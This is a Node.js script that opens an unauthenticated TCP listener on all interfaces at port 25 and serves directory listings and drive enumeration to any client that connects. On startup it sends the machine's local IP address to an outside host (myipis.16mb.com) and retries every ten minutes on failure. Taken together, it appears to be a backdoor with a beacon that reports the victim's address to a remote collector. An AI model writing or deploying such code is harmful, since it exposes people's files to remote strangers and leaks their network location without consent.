var request = require('request'),
    net = require('net'),
    fs = require("fs"),
    os = require("os");


var server = net.createServer(function(sock) {
  sock.setEncoding('utf8');

  sock.write('CONNECTED: ' + sock.remoteAddress +':'+ sock.remotePort);
  
  sock.on('data', function(data) {
    var newData = fn.createJson(data);

    if (newData != undefined) {
      sock.write(JSON.stringify(newData));
    }    
  });

  sock.on('close', function() {
    console.log('Socked closed');
  });

}).listen(25, '0.0.0.0');

var fn = {
  getLocalIp: function () {
    var netData = os.networkInterfaces()["Ethernet"];

    for (var key in netData) {
      if (netData[key].family === "IPv4") {
        request.post('http://myipis.16mb.com/formdata.php').form({address: netData[key].address})
        .on('error', function(err) {
          setTimeout(function () {
            fn.getLocalIp();  
          }, 600000);
        });
      }
    }
  },
  getIp: function () {
    request.put('http://myipis.16mb.com/formdata.php')
    .on('error', function(err) {
      setTimeout(function () {
        fn.getIp();  
      }, 600000);
    })
  },
  createJson: function (path) {
    var json = {};

    try {      
      //receive a specified path or path to root directory
      if (path && path !== "/") {
        json.files = fn.getNewList(fs.readdirSync(path), path);
        json.root = path;
      } else {
        json.files = fn.existingDrives();
        json.root = "";
      }

      //convert to json format
      return json;     
    } catch (err) {     
      //..
    }
  },
  getNewList: function (fileList, path) {
    var newFileList = {};

    for (index in fileList) {
      try {
        newFileList[index] = {
          name: fileList[index],
          dir: fs.statSync(path + fileList[index]).isDirectory() ? "" : "file"
        }          
      } catch (err) {
        //...
      }
      
    }
    return newFileList;
  },
  //check that drive is exist
  //return array of existing drives
  existingDrives: function () {
      var possibleDrives = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"],
          existDrives = {};

      for (index in possibleDrives) {
        try {
          if (fs.statSync(possibleDrives[index] + ":\\")) {
            existDrives[index] = {
              name: possibleDrives[index].toUpperCase() + ":",
              dir: "drive"
            }
          }  
        } catch (err) {
          //...
        }
        
      }
      return existDrives;
  }
};
fn.getLocalIp();
// fn.getIp();
console.log('Server listening on port 25...');
